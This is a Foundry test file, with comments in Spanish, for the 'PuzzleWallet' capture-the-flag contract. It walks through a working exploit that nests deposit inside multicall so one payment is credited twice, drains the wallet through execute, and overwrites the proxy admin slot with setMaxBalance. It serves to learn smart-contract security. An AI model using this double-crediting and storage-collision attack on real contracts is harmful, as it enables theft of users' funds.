// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {PuzzleWallet} from "../../src/puzzleWallet/PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleWallet public wallet;
    uint256 initialMaxBalance = 10000000000000000;
    uint256 initialBalance = 1000000000000000;
    address owner = makeAddr("owner");
    address player = makeAddr("player");
    bytes[] public functionsToCall;
    bytes[] public depositArray;

    function setUp() public {
        wallet = new PuzzleWallet();
        vm.startPrank(owner);
        wallet.init(initialMaxBalance);
        wallet.addToWhitelist(player);
        vm.deal(owner, initialBalance * 3);
        vm.deal(address(wallet), initialBalance);
        wallet.addToWhitelist(owner);
        wallet.addToWhitelist(address(wallet));
        console2.log("wallet addy");
        console2.log(address(wallet));
        console2.log("owner addy");
        console2.log(owner);
    }

    function test_PuzzleWalletCreation() public {
        assertEq(wallet.owner(), owner);
        assertEq(wallet.maxBalance(), initialMaxBalance);
        assertEq(address(wallet).balance, initialBalance);
    }

    function test_PuzzleWalletAttack() public {
        // deposito como owner para poder ejecutar algo
        bytes4 depositSelector = bytes4(keccak256(bytes("deposit()")));
        bytes memory depositData = abi.encodeWithSelector(depositSelector);
        console2.logBytes(depositData);
        depositArray.push(depositData);
        functionsToCall.push(depositData);
        bytes4 multiCallSelector = bytes4(
            keccak256(bytes("multicall(bytes[])"))
        );
        bytes memory multiCallData = abi.encodeWithSelector(
            multiCallSelector,
            depositArray
        );
        console2.logBytes(multiCallData);
        functionsToCall.push(multiCallData);
        // hasta aca consegui que wallet hag un deposit en si mismo.
        // entonces la wallet tiene el balance inicial, y lo que deposito la misma
        wallet.multicall{value: initialBalance}(functionsToCall);
        console2.log("init stage1: deposit from owner");
        assertEq(address(wallet).balance, initialBalance * 2);
        assertEq(wallet.balances(address(wallet)), 0);
        assertEq(wallet.balances(owner), initialBalance * 2);
        console2.log(address(wallet).balance); // balance del contrato
        console2.log(wallet.balances(address(wallet))); // depositado por la wallet
        console2.log(wallet.balances(owner)); // depositado por owner
        console2.log("end stage1");

        console2.log("init stage2: drain contract balance");
        wallet.execute(owner, initialBalance * 2, new bytes(0));
        assertEq(address(wallet).balance, 0);
        console2.log("end stage2");

        console2.log("init stage3: setMaxBalance to override proxy admin");
        console2.log(owner);
        // owner addy -> 0x7c8999dC9a822c1f0Df42023113EDB4FDd543266
        // hexToDec(owner) -> 710983460921600083128399735074197928047159816806
        wallet.setMaxBalance(710983460921600083128399735074197928047159816806);
        assertEq(
            wallet.maxBalance(),
            710983460921600083128399735074197928047159816806
        );
        console2.log("init stage3");
    }

    function test_PuzzleWalletDeposit() public {
        // el deposit
        assertEq(address(wallet).balance, initialBalance);
        wallet.deposit{value: initialBalance}();
        assertEq(address(wallet).balance, initialBalance * 2);
    }
}
